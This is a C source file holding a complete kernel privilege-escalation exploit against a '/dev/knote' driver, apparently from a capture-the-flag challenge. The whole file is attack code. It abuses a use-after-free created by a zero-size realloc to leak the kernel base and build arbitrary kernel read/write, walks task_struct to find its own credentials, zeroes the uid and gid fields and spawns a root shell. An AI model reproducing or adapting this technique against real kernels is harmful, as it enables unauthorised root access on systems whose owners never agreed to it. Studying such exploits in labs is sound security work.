#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/timerfd.h>


typedef struct {
    char* title;
    char* desc;
    ulong size;
} knote_req;

void knote_add(int fd, char* title, char* description, ulong size);
void knote_edit(int fd, char* title, char* description, ulong size);
void knote_delete(int fd, char* title);
knote_req knote_view(int fd, char* title, ulong size);  // Modifica il tipo di ritorno

void hexdump(char *buf, int size) {
  for (int i = 0; i < size; i = i + 8) {
    printf("0x%016llx\n", *(unsigned long long *)(&buf[i]));
  }
}

void knote_add(int fd, char* title, char* description, ulong size) {
    knote_req req = {
        .title=title,
        .desc = description,
        .size = size
    };
    ioctl(fd, 0xD00D0000, &req);
}

void knote_edit(int fd, char* title, char* description, ulong size) {
    knote_req req = {
        .title=title,
        .desc = description,
        .size = size
    };
    ioctl(fd, 0xD00D0003, &req);
}

void knote_delete(int fd, char* title) {
    knote_req req = {
        .title=title
    };
    ioctl(fd, 0xD00D0005, &req);
}

knote_req knote_view(int fd, char* title, ulong size) {
    char* description = malloc(size);
    knote_req req = {
        .title=title,
        .desc=description,
        .size=size
    };
    ioctl(fd, 0xD00D0002, &req);
    return req;  
}

int main() {
    puts("[*] START EXPLOIT");
    ulong offset = 0x2b4670;
    int fd = open("/dev/knote", O_RDWR);
    if (fd < 0) {
        perror("open failed ");
        return EXIT_FAILURE;
    }
    knote_add(fd, "victim", "kmalloc32", 0x20);// chunk size 0x20 
    knote_edit(fd, "victim", "", 0); //uaf with realloc size 0
   
    int lmao = open("/proc/self/stat", O_RDONLY);//this populate a chunk with size 0x20 my free/allocate chunk with a struct of function pointer 
    if (lmao < 0) {
        perror("open failed ");
        return EXIT_FAILURE;
    }
    knote_req kbase = knote_view(fd, "victim", 0x20); //leak kbase 
    printf("[!] ptr leak@:%llx\n", *(long*)(&kbase.desc[0]));
    //printf("[!] kbase leak@:%llx\n", *(long*)(&kbase.desc[0])-offset);
    unsigned long long kernel_base = *(long*)&kbase.desc[0]-0x2b4670;
    printf("[!] kbase leak@:%llx\n", kernel_base);
    
    //start the craft of arb w and r 
    knote_add(fd,"victim2","desc",0x48);
    knote_edit(fd,"victim2"," ",0);//uaf
    knote_add(fd,"victim3","desc",0x730);

    unsigned long long task_struct_off = (kernel_base + (0xffffffff82a0c900-0xffffffff81000000));//cat /proc/kallsyms | grep init_task  ->0xffffffff82a0c900
    printf("[!] leaking init task offset@: %llx \n",task_struct_off);
    unsigned long long cred =0;
    int exploit_pid = getpid();
    printf("[!] exploit pid %d\n",exploit_pid);
    int pid=0;
    knote_req request;
    for (int i=0;i<70;i++){
        request = knote_view(fd,"victim2",0x48);
        ((unsigned long long *)(request.desc))[6] = task_struct_off;
        //printf("[DEBUG] %llx\n",((unsigned long long *)(request.desc))[6]);
        //hexdump(request.desc,0x48);
        knote_edit(fd, "victim2",request.desc,0x48);
        request = knote_view(fd,"victim3",0x730);
        task_struct_off = *(unsigned long long *)(&request.desc[0x458])-0x458;
        pid = *(int *)(&request.desc[0x520]);
        //printf("pid : %d",pid);
        if(pid != exploit_pid){
            //printf("wrong pid %d\n",i);
            continue;   
        }
        cred = *(unsigned long long *)(&request.desc[0x708]); //address where i find cred, cred is a ptr inside task_struct were u can find uid gid
        printf("[!] leaked cred ptr@: %llx\n" , cred);
        //hexdump(request.desc,0x48);
        break;
    }
    printf("[*] editing cred\n");
    request = knote_view(fd,"victim2",0x48);//i rewrite request with the struct of the 2' chunk
    ((unsigned long long*)(request.desc))[6]=cred;
    knote_edit(fd,"victim2",request.desc,0x48);//edit the struct with the cred struct
    knote_req exploit_cred = knote_view(fd,"victim3",0x730); // saving cred chunk so i can rewrite variable 
    ((int*)(exploit_cred.desc))[1]=0;
    ((int*)(exploit_cred.desc))[2]=0;
    ((int*)(exploit_cred.desc))[3]=0;
    ((int*)(exploit_cred.desc))[4]=0;
    ((int*)(exploit_cred.desc))[5]=0;
    ((int*)(exploit_cred.desc))[6]=0;
    ((int*)(exploit_cred.desc))[7]=0;
    knote_edit(fd,"victim3",exploit_cred.desc,0xc0); // edit the cred chunk, to understand the dize of struct creds i edited the .gdbinit used gef and after after the cred leak i did the command slub-contains 0xffff88800479c840

    system("/bin/sh"); //call system 
    puts("[*] END EXPLOIT");
    
    return 0;
}
